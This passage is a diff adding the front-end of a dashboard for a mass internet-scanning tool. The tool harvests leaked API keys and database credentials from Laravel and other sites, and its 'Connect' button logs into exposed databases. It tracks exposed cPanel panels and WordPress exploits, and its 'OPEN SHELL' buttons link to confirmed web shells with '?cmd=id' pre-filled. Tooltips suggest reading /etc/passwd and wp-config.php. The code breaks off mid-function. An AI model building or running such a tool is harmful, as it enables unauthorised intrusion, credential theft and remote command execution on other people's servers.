+  if (hit.id != null) tr.dataset.id = String(hit.id);
+
+  const cell = (cls, content) => {
+    const td = document.createElement('td');
+    td.className = cls;
+    if (content instanceof Node) td.appendChild(content);
+    else { td.textContent = content; td.title = String(content); }
+    return td;
+  };
+
+  const url = hit.url || '';
+  const a = document.createElement('a');
+  a.href = url || '#';
+  a.target = '_blank';
+  a.rel = 'noopener noreferrer';
+  a.title = url;
+  try {
+    const u = new URL(url);
+    const short = (u.hostname + u.pathname).replace(/\/$/, '');
+    a.textContent = short.length > 48 ? short.slice(0, 46) + '…' : short;
+  } catch { a.textContent = url.slice(0, 48) || '—'; }
+
+  const time = (hit.detected_at || '').slice(0, 19).replace('T', ' ');
+
+  // Parse db credential label: "user@host/dbname:password"
+  function parseDbKey(key) {
+    try {
+      // password is after the last colon that follows a slash
+      const slashIdx = key.indexOf('/');
+      if (slashIdx === -1) return null;
+      const passColon = key.lastIndexOf(':');
+      if (passColon <= slashIdx) return null;
+      const password = key.slice(passColon + 1);
+      const atIdx    = key.indexOf('@');
+      const user     = atIdx !== -1 ? key.slice(0, atIdx) : '';
+      const hostPart = key.slice(atIdx !== -1 ? atIdx + 1 : 0, slashIdx);
+      const dbPart   = key.slice(slashIdx + 1, passColon);
+      const [rawHost, rawPort] = hostPart.includes(':')
+        ? [hostPart.split(':')[0], hostPart.split(':')[1]]
+        : [hostPart, ''];
+      return { host: rawHost, port: parseInt(rawPort) || 3306,
+               user, password, database: dbPart, driver: 'mysql' };
+    } catch { return null; }
+  }
+
+  tr.appendChild(cell('td-num', String(rowCount)));
+  tr.appendChild(cell('td-src', vendorBadge(hit.vendor)));
+  tr.appendChild(cell('td-src', verifiedBadge(hit.verified, hit.vendor)));
+
+  // For db rows, add a Connect button alongside the credential
+  if (hit.vendor === 'db') {
+    const keyTd = document.createElement('td');
+    keyTd.className = 'td-key';
+    const keySpan = document.createElement('span');
+    keySpan.textContent = hit.resend_key || '—';
+    keySpan.title = hit.resend_key || '';
+    const btn = document.createElement('button');
+    btn.className = 'btn-connect';
+    btn.textContent = 'Connect';
+    btn.style.marginLeft = '8px';
+    btn.addEventListener('click', () => {
+      const creds = parseDbKey(hit.resend_key || '');
+      window.openDbModal(creds);
+    });
+    keyTd.appendChild(keySpan);
+    keyTd.appendChild(btn);
+    tr.appendChild(keyTd);
+  } else {
+    tr.appendChild(cell('td-key', hit.resend_key || '—'));
+  }
+
+  // Domain cell with liveness dot
+  const domTd = document.createElement('td');
+  domTd.className = 'td-dom';
+  if (hit.domain_alive === 1) {
+    domTd.innerHTML = `<span style="color:#10b981;margin-right:4px" title="Domain is live">●</span>${hit.linked_domain || '—'}`;
+  } else if (hit.domain_alive === 0) {
+    domTd.innerHTML = `<span style="color:#6b7280;margin-right:4px" title="Domain is dead/unreachable">●</span>${hit.linked_domain || '—'}`;
+    domTd.style.opacity = '0.45';
+    tr.dataset.dead = '1';
+  } else {
+    domTd.textContent = hit.linked_domain || '—';
+  }
+  tr.appendChild(domTd);
+  tr.appendChild(cell('td-url', a));
+  tr.appendChild(cell('td-time', time));
+
+  feedBody.appendChild(tr);
+
+  if (autoScroll) {
+    tblWrap.scrollTop = tblWrap.scrollHeight;
+  } else if (isNew) {
+    pendingNew++;
+    toastEl.textContent = `▼ ${pendingNew} new hit${pendingNew > 1 ? 's' : ''} – scroll down`;
+    toastWrap.classList.add('show');
+  }
+}
+
+tblWrap.addEventListener('scroll', () => {
+  const atBottom = tblWrap.scrollHeight - tblWrap.scrollTop - tblWrap.clientHeight < 40;
+  autoScroll = atBottom;
+  if (atBottom) { pendingNew = 0; toastWrap.classList.remove('show'); }
+});
+toastEl.addEventListener('click', () => {
+  autoScroll = true; pendingNew = 0;
+  toastWrap.classList.remove('show');
+  tblWrap.scrollTo({ top: tblWrap.scrollHeight, behavior: 'smooth' });
+});
+
+function startSSE(afterId = 0) {
+  if (evtSource) { evtSource.close(); evtSource = null; }
+  evtSource = new EventSource(`${API}/api/stream?after=${afterId}`);
+
+  evtSource.addEventListener('finding', e => {
+    try {
+      const hit = JSON.parse(e.data);
+      if (hit.id != null && hit.id > maxLoadedId) maxLoadedId = hit.id;
+      if (hit.id != null && seenIds.has(hit.id)) return;
+      sessionHits++;
+      statFound.textContent = sessionHits;
+      addRow(hit, true);
+    } catch {}
+  });
+
+  evtSource.addEventListener('stats', e => {
+    try {
+      const s = JSON.parse(e.data);
+      statTotal.textContent = s.total_findings;
+      if (s.hosts_scanned != null) statHosts.textContent = s.hosts_scanned;
+      if (s.running) {
+        if (!isRunning) setRunning(true, s.uptime_seconds || 0);
+        else localUptime = s.uptime_seconds || 0;
+      } else if (isRunning) {
+        setRunning(false, 0, s.last_run_state || 'finished');
+        // Run just finished — re-fetch findings to pick up verification updates.
+        refreshVerifiedStatus();
+        document.dispatchEvent(new Event('scan-finished'));
+      }
+    } catch {}
+  });
+  // Reconnect automatically if the connection drops during a long scan
+  evtSource.onerror = () => {
+    evtSource.close();
+    evtSource = null;
+    setTimeout(() => startSSE(maxLoadedId), 3000);
+  };
+}
+
+// Re-render existing rows to reflect verification state changes after a run.
+// Only fetch what's actually on screen — saves a full DB scan when the table
+// is small, and avoids the 1000-row API cap dropping older rows.
+async function refreshVerifiedStatus() {
+  try {
+    const rows = document.querySelectorAll('#feedBody tr');
+    if (rows.length === 0) return;
+    const limit = Math.min(1000, Math.max(rows.length, 200));
+    const findings = await (await fetch(`${API}/api/findings?limit=${limit}`)).json();
+    const byId = new Map(findings.map(f => [f.id, f]));
+    rows.forEach(tr => {
+      const id = tr.dataset.id ? Number(tr.dataset.id) : null;
+      if (id == null) return;
+      const match = byId.get(id);
+      if (!match) return;
+      const liveCell = tr.children[2];  // Live column is always the 3rd cell
+      if (liveCell && liveCell.firstChild) {
+        liveCell.replaceChild(verifiedBadge(match.verified, match.vendor), liveCell.firstChild);
+      }
+    });
+  } catch {}
+}
+
+// Live console SSE
+let logEvtSource = null;
+let logLineCount = 0;
+let _lastLogSeq = 0;  // track server sequence so reconnects don't replay lines
+const logBox = document.getElementById('logBox');
+const logCount = document.getElementById('logCount');
+
+function startLogSSE(afterSeq) {
+  if (afterSeq == null) afterSeq = _lastLogSeq;
+  if (logEvtSource) { logEvtSource.close(); logEvtSource = null; }
+  logEvtSource = new EventSource(`${API}/api/log-stream?after=${afterSeq}`);
+  logEvtSource.addEventListener('log', e => {
+    try {
+      const d = JSON.parse(e.data);
+      if (d.seq != null) _lastLogSeq = Math.max(_lastLogSeq, d.seq);
+      if (logLineCount === 0) logBox.innerHTML = '';
+      const div = document.createElement('div');
+      let line = d.line || '';
+      // Colour-code obvious markers
+      if (line.includes('EXPOSED:')) div.style.color = '#ef4444';
+      else if (line.includes('[NEW]') || line.includes('/NEW]') || line.includes('✓ live')) div.style.color = '#10b981';
+      else if (line.startsWith('[shodan]') || line.startsWith('[censys]') || line.startsWith('[netlas]') || line.startsWith('[crtsh]') || line.startsWith('[prefilter]')) div.style.color = '#6366f1';
+      else if (line.startsWith('[subnet]')) div.style.color = '#a78bfa';
+      else if (line.includes('⚠')) div.style.color = '#f59e0b';
+      div.textContent = line;
+      logBox.appendChild(div);
+      logLineCount++;
+      logCount.textContent = `${logLineCount} line${logLineCount !== 1 ? 's' : ''}`;
+      // Auto-scroll
+      const atBottom = logBox.scrollHeight - logBox.scrollTop - logBox.clientHeight < 80;
+      if (atBottom) logBox.scrollTop = logBox.scrollHeight;
+      // Cap at 2000 lines to prevent unbounded growth
+      while (logBox.children.length > 2000) logBox.removeChild(logBox.firstChild);
+    } catch {}
+  });
+  // Reconnect automatically if the connection drops (e.g. during a 1h+ scan)
+  logEvtSource.onerror = () => {
+    logEvtSource.close();
+    logEvtSource = null;
+    setTimeout(() => startLogSSE(_lastLogSeq), 3000);
+  };
+}
+
+document.getElementById('logClearBtn').addEventListener('click', () => {
+  logBox.innerHTML = '<span style="color:var(--muted)">Console cleared.</span>';
+  logLineCount = 0;
+  logCount.textContent = '0 lines';
+});
+
+startBtn.addEventListener('click', async () => {
+  const targets = document.getElementById('laravelTargets').value.trim();
+  const asnTargets = document.getElementById('asnTargets').value.trim();
+  if (!_uploadedToken && !targets && !asnTargets) {
+    alert('Enter at least one target domain/IP, load a file, or provide ASN numbers.');
+    return;
+  }
+  // When only ASNs provided (no direct targets), send a placeholder so the
+  // server has a targets file to pass to harvester — actual targets come from ASN resolution.
+  const effectiveTargets = (!_uploadedToken && !targets && asnTargets) ? '# ASN-only run' : targets;
+  startBtn.disabled = true;
+  const body = {
+    concurrency:     parseInt(document.getElementById('concurrency').value, 10) || 50,
+    laravel_targets: _uploadedToken ? null : effectiveTargets,
+    targets_token:   _uploadedToken || null,
+    proxy:           document.getElementById('proxy').value.trim() || null,
+    proxy_rotation:  document.getElementById('proxyRotation').value || 'round-robin',
+    proxy_retries:   parseInt(document.getElementById('proxyRetries').value, 10) || 0,
+    skip_proxy_health_check: document.getElementById('proxySkipHealth').checked,
+    auto_expand_subnet: document.getElementById('optAutoExpand').checked,
+    enable_crtsh:       document.getElementById('optCrtsh').checked,
+    enable_urlscan:     document.getElementById('optUrlscan')?.checked || false,
+    enable_verify:      document.getElementById('optVerify').checked,
+    asns:               document.getElementById('asnTargets').value.trim() || null,
+    ipinfo_token:       document.getElementById('ipinfoToken').value.trim() || null,
+    fast_paths:           (() => { const v = document.getElementById('optPathsMode').value; return v === 'fast' ? true : v === 'all' ? false : null; })(),
+    enable_tcp_prefilter:  document.getElementById('optTcpPrefilter').checked,
+    enable_subnet_expand:  document.getElementById('optSubnetExpand').checked,
+    max_hosts_per_run:    parseInt(document.getElementById('maxHostsPerRun').value, 10) || 0,
+    scan_mode:            document.querySelector('input[name="scanMode"]:checked')?.value || 'laravel',
+    github_token:         document.getElementById('githubToken').value.trim() || null,
+  };
+  try {
+    const r = await fetch(`${API}/api/start`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+    const d = await r.json();
+    if (d.ok) {
+      // Token consumed by server — clear local state
+      _uploadedToken = null;
+      _setUploadBadge('');
+      document.getElementById('laravelTargets').disabled = false;
+      document.getElementById('laravelTargets').style.opacity = '';
+      setRunning(true);
+      sessionHits = 0;
+      statFound.textContent = '0';
+      startSSE(maxLoadedId);
+    } else {
+      // Only clear the upload token if the server actually consumed (popped)
+      // it. Pre-validation errors (bad concurrency, proxy URL typo, etc.)
+      // return token_consumed:false, meaning the file is still waiting and
+      // the user can fix the setting and retry without re-uploading.
+      if (_uploadedToken && d.token_consumed !== false) {
+        _uploadedToken = null;
+        _setUploadBadge('');
+        document.getElementById('laravelTargets').disabled = false;
+        document.getElementById('laravelTargets').style.opacity = '';
+      }
+      alert('Start failed: ' + (d.error || 'unknown'));
+      startBtn.disabled = false;
+    }
+  } catch (err) {
+    // Network failure — server state unknown. Conservative: clear so user
+    // can re-upload rather than retrying with a potentially stale token.
+    if (_uploadedToken) {
+      _uploadedToken = null;
+      _setUploadBadge('');
+      document.getElementById('laravelTargets').disabled = false;
+      document.getElementById('laravelTargets').style.opacity = '';
+    }
+    alert('Cannot reach the backend.\n\n' + err);
+    startBtn.disabled = false;
+  }
+});
+
+stopBtn.addEventListener('click', async () => {
+  stopBtn.disabled = true;
+  try { await fetch(`${API}/api/stop`, { method: 'POST' }); } catch {}
+  setRunning(false, 0, 'stopped');
+  if (evtSource) { evtSource.close(); evtSource = null; }
+});
+
+extractBtn.addEventListener('click', () => {
+  const fmt = document.getElementById('exportFmt').value;
+  window.location.href = `${API}/api/export?format=${fmt}`;
+});
+
+document.getElementById('dbManualBtn').addEventListener('click', () => {
+  window.openDbModal(null);
+});
+
+document.getElementById('clearHistoryBtn').addEventListener('click', async () => {
+  if (!confirm('Clear scan history? All hosts will be eligible for re-scanning on the next run.')) return;
+  try {
+    const r = await fetch(`${API}/api/clear-history`, { method: 'POST' });
+    const d = await r.json();
+    if (d.ok) {
+      statHosts.textContent = '0';
+      alert(`Cleared ${d.cleared} host(s) from scan history.`);
+    }
+  } catch (e) { alert('Error: ' + e); }
+});
+
+// ── verify domains / hide dead ───────────────────────────────────────────────
+document.getElementById('verifyDomainsBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('verifyDomainsBtn');
+  btn.disabled = true;
+  btn.textContent = '⏳ Checking…';
+  try {
+    const r = await fetch(`${API}/api/verify-domains`, { method: 'POST' });
+    const d = await r.json();
+    btn.textContent = `⚡ Verify Domains`;
+    btn.disabled = false;
+    alert(`Checked ${d.checked} domain(s): ${d.alive} live, ${d.dead} dead.\nRefreshing table…`);
+    // reload findings so dead dots appear
+    const rows = await (await fetch(`${API}/api/findings?limit=1000`)).json();
+    feedBody.innerHTML = '';
+    seenIds.clear();
+    rowCount = 0;
+    rows.slice().reverse().forEach(r => addRow(r, false));
+    applyDeadFilter();
+  } catch(e) {
+    btn.textContent = '⚡ Verify Domains';
+    btn.disabled = false;
+    alert('Error: ' + e);
+  }
+});
+
+function applyDeadFilter() {
+  const hide = document.getElementById('hideDead').checked;
+  document.querySelectorAll('#feedBody tr[data-dead="1"]').forEach(tr => {
+    tr.style.display = hide ? 'none' : '';
+  });
+}
+document.getElementById('hideDead').addEventListener('change', applyDeadFilter);
+
+// ── proxy test handler ───────────────────────────────────────────────────────
+document.getElementById('proxyTestBtn').addEventListener('click', async () => {
+  const proxyText = document.getElementById('proxy').value.trim();
+  const status = document.getElementById('proxyTestStatus');
+  if (!proxyText) {
+    status.textContent = 'No proxies to test';
+    status.style.color = 'var(--muted)';
+    return;
+  }
+  const btn = document.getElementById('proxyTestBtn');
+  btn.disabled = true;
+  status.textContent = 'Testing…';
+  status.style.color = 'var(--muted)';
+  try {
+    const r = await fetch(`${API}/api/proxy-test`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ proxy: proxyText }),
+    });
+    const d = await r.json();
+    if (!d.ok) {
+      status.textContent = `✗ ${d.error}`;
+      status.style.color = '#e74c3c';
+      return;
+    }
+    const lines = d.results.map(r =>
+      r.ok
+        ? `✓ ${r.proxy}  egress=${r.egress_ip || '?'}`
+        : `✗ ${r.proxy}  ${r.error || 'HTTP ' + r.status}`
+    );
+    status.innerHTML = `${d.alive}/${d.total} live`;
+    status.style.color = d.alive === d.total ? 'var(--accent)' : (d.alive > 0 ? '#f39c12' : '#e74c3c');
+    alert('Proxy health check:\n\n' + lines.join('\n'));
+  } catch (err) {
+    status.textContent = `✗ Error: ${err}`;
+    status.style.color = '#e74c3c';
+  } finally {
+    btn.disabled = false;
+  }
+});
+
+// ── file upload handler ──────────────────────────────────────────────────────
+// Files ≤ 500 KB: read into textarea (existing behaviour).
+// Files > 500 KB: stream directly to /api/upload-targets, store token.
+const LARGE_FILE_THRESHOLD = 500 * 1024; // 500 KB ≈ ~40k domains
+let _uploadedToken = null;
+
+const uploadStatus  = document.getElementById('uploadStatus');
+const clearUploadBtn = document.getElementById('clearUploadBtn');
+
+function _setUploadBadge(msg, color) {
+  uploadStatus.textContent = msg;
+  uploadStatus.style.color = color || 'var(--accent)';
+  uploadStatus.style.display = msg ? 'inline' : 'none';
+  clearUploadBtn.style.display = msg ? 'inline-block' : 'none';
+}
+
+clearUploadBtn.addEventListener('click', () => {
+  _uploadedToken = null;
+  _setUploadBadge('');
+  document.getElementById('laravelTargets').disabled = false;
+  document.getElementById('laravelTargets').style.opacity = '';
+});
+
+document.getElementById('targetFile').addEventListener('change', async function() {
+  const file = this.files[0];
+  this.value = '';  // reset so same file can be reloaded
+  if (!file) return;
+
+  if (file.size <= LARGE_FILE_THRESHOLD) {
+    // Small file: load into textarea
+    const reader = new FileReader();
+    reader.onload = e => {
+      const ta = document.getElementById('laravelTargets');
+      const existing = ta.value.trim();
+      const incoming = e.target.result.trim();
+      ta.value = existing ? existing + '\n' + incoming : incoming;
+    };
+    reader.readAsText(file);
+    return;
+  }
+
+  // Large file: upload directly to server
+  const mb = (file.size / 1048576).toFixed(1);
+  _setUploadBadge(`Uploading ${mb} MB…`, 'var(--muted)');
+  document.getElementById('laravelTargets').disabled = true;
+  document.getElementById('laravelTargets').style.opacity = '0.4';
+
+  try {
+    const fd = new FormData();
+    fd.append('file', file);
+    const resp = await fetch(`${API}/api/upload-targets`, { method: 'POST', body: fd });
+    const d = await resp.json();
+    if (d.ok) {
+      _uploadedToken = d.token;
+      const lines = (d.lines || 0).toLocaleString();
+      _setUploadBadge(`✓ ${lines} targets ready (${mb} MB)`, 'var(--accent)');
+    } else {
+      _uploadedToken = null;
+      _setUploadBadge(`Upload failed: ${d.error}`, '#e74c3c');
+      document.getElementById('laravelTargets').disabled = false;
+      document.getElementById('laravelTargets').style.opacity = '';
+    }
+  } catch (err) {
+    _uploadedToken = null;
+    _setUploadBadge(`Upload error: ${err}`, '#e74c3c');
+    document.getElementById('laravelTargets').disabled = false;
+    document.getElementById('laravelTargets').style.opacity = '';
+  }
+});
+
+(async () => {
+  try {
+    const s = await (await fetch(`${API}/api/status`)).json();
+    statTotal.textContent = s.total_findings;
+    if (s.hosts_scanned != null) statHosts.textContent = s.hosts_scanned;
+    if (s.running) {
+      setRunning(true, s.uptime_seconds || 0);
+    } else {
+      setRunning(false, 0, s.last_run_state || null);
+    }
+  } catch {}
+
+  try {
+    const findings = await (await fetch(`${API}/api/findings?limit=200`)).json();
+    [...findings].reverse().forEach(hit => {
+      addRow(hit, false);
+      if (hit.id > maxLoadedId) maxLoadedId = hit.id;
+    });
+    if (rowCount > 0) { autoScroll = true; tblWrap.scrollTop = tblWrap.scrollHeight; }
+  } catch {}
+
+  startSSE(maxLoadedId);
+  startLogSSE();
+})();
+
+</script>
+
+<!-- DB Connect Modal -->
+<div class="db-modal-overlay" id="dbModalOverlay">
+  <div class="db-modal">
+    <h3>🔌 Connect to Database</h3>
+    <div class="db-field">
+      <label>Driver</label>
+      <select id="dbDriver">
+        <option value="mysql">MySQL / MariaDB</option>
+        <option value="pgsql">PostgreSQL</option>
+      </select>
+    </div>
+    <div class="db-row">
+      <div class="db-field">
+        <label>Host</label>
+        <input id="dbHost" type="text" placeholder="127.0.0.1">
+      </div>
+      <div class="db-field">
+        <label>Port (optional)</label>
+        <input id="dbPort" type="number" placeholder="auto">
+      </div>
+    </div>
+    <div class="db-field">
+      <label>Username</label>
+      <input id="dbUser" type="text" placeholder="root">
+    </div>
+    <div class="db-field">
+      <label>Password</label>
+      <input id="dbPass" type="text" placeholder="">
+    </div>
+    <div class="db-field">
+      <label>Database (optional)</label>
+      <input id="dbName" type="text" placeholder="">
+    </div>
+    <div class="db-actions">
+      <button class="btn-extract" id="dbConnectBtn">Connect</button>
+      <button class="btn-extract" id="dbCloseBtn" style="background:none;border-color:var(--border);color:var(--muted)">Cancel</button>
+    </div>
+    <div class="db-result" id="dbResult">
+      <div id="dbResultMsg"></div>
+      <div class="db-tables" id="dbTables"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  const overlay   = document.getElementById('dbModalOverlay');
+  const driverSel = document.getElementById('dbDriver');
+  const hostIn    = document.getElementById('dbHost');
+  const portIn    = document.getElementById('dbPort');
+  const userIn    = document.getElementById('dbUser');
+  const passIn    = document.getElementById('dbPass');
+  const nameIn    = document.getElementById('dbName');
+  const connectBtn= document.getElementById('dbConnectBtn');
+  const closeBtn  = document.getElementById('dbCloseBtn');
+  const resultBox = document.getElementById('dbResult');
+  const resultMsg = document.getElementById('dbResultMsg');
+  const tablesList= document.getElementById('dbTables');
+
+  // Default port when driver changes
+  driverSel.addEventListener('change', () => {
+    portIn.value = '';  // clear so auto-detect kicks in
+  });
+
+  function openModal(creds) {
+    resultBox.style.display = 'none';
+    resultBox.className = 'db-result';
+    resultMsg.textContent = '';
+    tablesList.textContent = '';
+    if (creds) {
+      driverSel.value = creds.driver || 'mysql';
+      hostIn.value    = creds.host || '';
+      portIn.value    = creds.port || (creds.driver === 'pgsql' ? '5432' : '3306');
+      userIn.value    = creds.user || '';
+      passIn.value    = creds.password || '';
+      nameIn.value    = creds.database || '';
+    }
+    overlay.classList.add('open');
+    hostIn.focus();
+  }
+
+  window.openDbModal = openModal;
+
+  closeBtn.addEventListener('click', () => overlay.classList.remove('open'));
+  overlay.addEventListener('click', e => { if (e.target === overlay) overlay.classList.remove('open'); });
+
+  connectBtn.addEventListener('click', async () => {
+    connectBtn.textContent = 'Connecting…';
+    connectBtn.disabled = true;
+    resultBox.style.display = 'none';
+    try {
+      const res = await fetch(`${window.API || ''}/api/db-connect`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          host:     hostIn.value.trim(),
+          port:     parseInt(portIn.value) || null,
+          user:     userIn.value.trim(),
+          password: passIn.value,
+          database: nameIn.value.trim(),
+          driver:   driverSel.value,
+        }),
+      });
+      const d = await res.json();
+      resultBox.style.display = 'block';
+      if (d.ok) {
+        resultBox.className = 'db-result ok';
+        const portStr = d.port ? ` (port ${d.port})` : '';
+        resultMsg.textContent = '✓ Connected successfully' + portStr;
+        tablesList.textContent = d.tables && d.tables.length
+          ? 'Tables: ' + d.tables.join(', ')
+          : '(no tables — try specifying a database name)';
+      } else {
+        resultBox.className = 'db-result err';
+        resultMsg.textContent = '✗ ' + (d.error || 'Connection failed');
+        tablesList.textContent = '';
+      }
+    } catch(e) {
+      resultBox.style.display = 'block';
+      resultBox.className = 'db-result err';
+      resultMsg.textContent = '✗ Request failed: ' + e.message;
+    } finally {
+      connectBtn.textContent = 'Connect';
+      connectBtn.disabled = false;
+    }
+  });
+})();
+
+// ── Exposed Panels ────────────────────────────────────────────────────────────
+(function() {
+  const panelBadge  = document.getElementById('panelBadge');
+  const panelEmpty  = document.getElementById('panelEmpty');
+  const panelTable  = document.getElementById('panelTable');
+  const panelBody   = document.getElementById('panelBody');
+  const panelRefresh= document.getElementById('panelRefreshBtn');
+  const panelExport = document.getElementById('panelExportBtn');
+
+  function panelBadge$(n) {
+    panelBadge.textContent = `${n} found`;
+  }
+
+  function serviceBadge(service) {
+    const el = document.createElement('span');
+    el.className = 'badge';
+    const s = PANEL_STYLE[service] || { bg: '#4b5563', label: service };
+    el.style.background = s.bg;
+    el.textContent = s.label;
+    return el;
+  }
+
+  function verifiedCell(verified) {
+    const el = document.createElement('span');
+    el.className = 'badge';
+    if (verified === 1)      { el.style.background = '#10b981'; el.textContent = '✓ valid'; }
+    else if (verified === 0) { el.style.background = '#6b7280'; el.textContent = '✗ failed'; }
+    else                     { el.style.background = 'transparent'; el.style.color = 'var(--muted)'; el.textContent = '—'; }
+    return el;
+  }
+
+  async function loadPanels() {
+    try {
+      const rows = await (await fetch(`${API}/api/cpanel-findings?limit=500`)).json();
+      panelBody.innerHTML = '';
+      if (!rows.length) {
+        panelEmpty.style.display = '';
+        panelTable.style.display = 'none';
+        panelBadge$(0);
+        return;
+      }
+      panelEmpty.style.display = 'none';
+      panelTable.style.display = 'table';
+      panelBadge$(rows.length);
+      rows.forEach((r, i) => {
+        const tr = document.createElement('tr');
+        const cell = (cls, content) => {
+          const td = document.createElement('td');
+          td.className = cls;
+          if (content instanceof Node) td.appendChild(content);
+          else { td.textContent = content; td.title = String(content); }
+          return td;
+        };
+        const a = document.createElement('a');
+        a.href = r.url || '#'; a.target = '_blank'; a.rel = 'noopener noreferrer';
+        try {
+          const u = new URL(r.url);
+          a.textContent = (u.hostname + u.pathname).replace(/\/$/, '').slice(0, 48);
+        } catch { a.textContent = (r.url || '').slice(0, 48); }
+
+        tr.appendChild(cell('td-num', String(i + 1)));
+        tr.appendChild(cell('td-src', serviceBadge(r.service)));
+        tr.appendChild(cell('td-dom', r.host || '—'));
+        tr.appendChild(cell('td-num', String(r.port || '—')));
+        tr.appendChild(cell('td-url', a));
+        tr.appendChild(cell('td-src', verifiedCell(r.verified)));
+        tr.appendChild(cell('td-time', (r.detected_at || '').slice(0, 19).replace('T', ' ')));
+        panelBody.appendChild(tr);
+      });
+    } catch(e) {
+      console.error('panels fetch failed', e);
+    }
+  }
+
+  panelRefresh.addEventListener('click', loadPanels);
+  panelExport.addEventListener('click', () => { window.location.href = `${API}/api/cpanel-export`; });
+
+  // Auto-refresh panels when a scan finishes
+  document.addEventListener('scan-finished', loadPanels);
+  loadPanels();
+})();
+
+// ── WordPress Vulnerabilities ─────────────────────────────────────────────────
+(function() {
+  const wpBadge   = document.getElementById('wpBadge');
+  const wpEmpty   = document.getElementById('wpEmpty');
+  const wpTable   = document.getElementById('wpTable');
+  const wpBody    = document.getElementById('wpBody');
+  const wpRefresh = document.getElementById('wpRefreshBtn');
+  const wpExport  = document.getElementById('wpExportBtn');
+
+  const SEV_STYLE = {
+    critical: { bg: '#ef4444', label: 'CRITICAL' },
+    high:     { bg: '#f97316', label: 'HIGH' },
+    medium:   { bg: '#f59e0b', label: 'MEDIUM' },
+    low:      { bg: '#6b7280', label: 'LOW' },
+    info:     { bg: '#4b5563', label: 'INFO' },
+  };
+
+  function sevBadge(severity) {
+    const el = document.createElement('span');
+    el.className = 'badge';
+    const s = SEV_STYLE[(severity || 'info').toLowerCase()] || SEV_STYLE.info;
+    el.style.background = s.bg;
+    el.textContent = s.label;
+    return el;
+  }
+
+  const wpShellsBanner = document.getElementById('wpShellsBanner');
+  const wpShellCount   = document.getElementById('wpShellCount');
+  const wpShellList    = document.getElementById('wpShellList');
+
+  async function loadWpFindings() {
+    try {
+      const rows = await (await fetch(`${API}/api/wp-findings?limit=2000`)).json();
+      wpBody.innerHTML = '';
+      wpShellList.innerHTML = '';
+
+      if (!rows.length) {
+        wpEmpty.style.display = '';
+        wpTable.style.display = 'none';
+        wpShellsBanner.style.display = 'none';
+        wpBadge.textContent = '0 found';
+        return;
+      }
+
+      wpEmpty.style.display = 'none';
+      wpTable.style.display = 'table';
+
+      const vulnCount   = rows.filter(r => r.severity !== 'info').length;
+      const shellRows   = rows.filter(r => r.verified === 1 && r.shell_url);
+      wpBadge.textContent = `${rows.length} rows (${vulnCount} vuln${vulnCount !== 1 ? 's' : ''})`;
+
+      // Confirmed shells banner
+      if (shellRows.length) {
+        wpShellsBanner.style.display = '';
+        wpShellCount.textContent = `${shellRows.length} confirmed`;
+        shellRows.forEach(r => {
+          let domain = r.domain || '';
+          if (!domain) { try { domain = new URL(r.url).hostname; } catch {} }
+          const row = document.createElement('div');
+          row.style.cssText = 'display:flex;align-items:center;gap:10px;font-size:12px';
+          const domEl = document.createElement('span');
+          domEl.style.cssText = 'color:#f87171;font-weight:600;min-width:160px';
+          domEl.textContent = domain;
+          const btn = document.createElement('a');
+          btn.href = r.shell_url + '?cmd=id'; btn.target = '_blank'; btn.rel = 'noopener noreferrer';
+          btn.style.cssText = 'padding:3px 10px;background:#dc2626;color:#fff;border-radius:4px;font-size:11px;font-weight:700;text-decoration:none;letter-spacing:.5px';
+          btn.textContent = 'OPEN SHELL';
+          btn.title = `?cmd=whoami  ?cmd=ls+-la  ?f=/etc/passwd  ?f=../wp-config.php`;
+          const shellSpan = document.createElement('span');
+          shellSpan.style.cssText = 'font-size:10px;color:#6b7280;font-family:monospace';
+          shellSpan.textContent = r.shell_url;
+          row.appendChild(domEl); row.appendChild(btn); row.appendChild(shellSpan);
+          wpShellList.appendChild(row);
+        });
+      } else {
+        wpShellsBanner.style.display = 'none';
+      }
+
+      rows.forEach((r, i) => {
+        const tr = document.createElement('tr');
+        const cell = (cls, content) => {
+          const td = document.createElement('td');
+          td.className = cls;
+          if (content instanceof Node) td.appendChild(content);
+          else { td.textContent = content; td.title = String(content || ''); }
+          return td;
+        };
+
+        // Domain cell — prefer stored domain name, fall back to hostname from URL
+        let domain = r.domain || '';
+        if (!domain) { try { domain = new URL(r.url).hostname; } catch { domain = r.url || ''; } }
+        const domEl = document.createElement('a');
+        domEl.href = r.url || '#'; domEl.target = '_blank'; domEl.rel = 'noopener noreferrer';
+        domEl.textContent = domain.slice(0, 40);
+        domEl.title = r.url || '';
+
+        // Verified badge
+        const verifiedEl = document.createElement('span');
+        verifiedEl.className = 'badge';
+        if (r.verified === 1) { verifiedEl.style.background = '#16a34a'; verifiedEl.textContent = '✓ LIVE'; }
+        else if (r.verified === 0) { verifiedEl.style.background = '#6b7280'; verifiedEl.textContent = '✗'; }
+        else { verifiedEl.textContent = '—'; }
+
+        // Shell button — links to shell with ?cmd= pre-filled for immediate RCE
+        const shellEl = document.createElement('span');
+        if (r.verified === 1 && r.shell_url) {
+          const cmdUrl = r.shell_url + '?cmd=id';
+          const sa = document.createElement('a');
+          sa.href = cmdUrl; sa.target = '_blank'; sa.rel = 'noopener noreferrer';
+          sa.style.cssText = 'padding:2px 8px;background:#dc2626;color:#fff;border-radius:4px;font-size:10px;font-weight:700;text-decoration:none';
+          sa.textContent = 'OPEN SHELL';
+          sa.title = `Shell: ${r.shell_url}\nUsage: ?cmd=whoami  ?cmd=ls+-la  ?f=/etc/passwd`;
+          shellEl.appendChild(sa);
+          // Copy URL button
+          const cp = document.createElement('button');
+          cp.style.cssText = 'margin-left:5px;padding:2px 6px;background:none;border:1px solid #dc2626;color:#dc2626;border-radius:4px;font-size:9px;cursor:pointer';
+          cp.textContent = 'copy';
+          cp.title = r.shell_url;
+          cp.onclick = () => { navigator.clipboard.writeText(r.shell_url); cp.textContent = '✓'; setTimeout(() => cp.textContent = 'copy', 1500); };
+          shellEl.appendChild(cp);
+        } else if (r.shell_url) {
+          const sa = document.createElement('a');
+          sa.href = r.shell_url; sa.target = '_blank'; sa.rel = 'noopener noreferrer';
+          sa.style.color = '#6b7280'; sa.textContent = 'link';
+          shellEl.appendChild(sa);
+        }
+
+        // Rescan button — removes host from checkpoint cache and fires single-host WP exploit
+        const rescanEl = document.createElement('button');
+        rescanEl.textContent = '↺ Rescan';
